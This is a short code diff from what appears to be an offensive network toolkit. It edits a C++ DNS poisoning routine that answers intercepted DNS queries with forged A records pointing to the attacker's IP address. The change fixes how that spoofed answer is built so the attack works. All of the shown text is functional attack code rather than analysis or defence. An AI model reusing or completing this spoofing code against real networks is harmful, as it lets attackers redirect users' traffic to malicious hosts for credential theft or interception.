@@ -47,8 +47,6 @@ void ATK::DNS::AllOutDnsPoisoningStrategy::onPacketArrives(
         return;
 
     // craft response packet
-    pcpp::Packet responsePacket(100);
-
     pcpp::EthLayer ethResponse(device_->getMacAddress(),
                                requestEthLayer->getSourceMac());
     pcpp::IPv4Layer ipResponse(device_->getIPv4Address(),
@@ -62,10 +60,10 @@ void ATK::DNS::AllOutDnsPoisoningStrategy::onPacketArrives(
     dnsResponse.getDnsHeader()->recursionAvailable = 1;
     dnsResponse.getDnsHeader()->recursionDesired = requestDnsLayer->getDnsHeader()->recursionDesired;
 
-    // TODO fill with the attacker's desired IP to reroute to
     dnsResponse.addQuery(dnsQuery); // Repeat the question
+    pcpp::IPv4DnsResourceData attackerIpData(attackerIp_);
     dnsResponse.addAnswer(dnsQuery->getName(), pcpp::DNS_TYPE_A,
-                              pcpp::DNS_CLASS_IN, 60, attackerIp_);
+                              pcpp::DNS_CLASS_IN, 60, &attackerIpData);
 
     pcpp::Packet responsePacket(DNS_PACKET_SIZE);
     responsePacket.addLayer(&ethResponse);
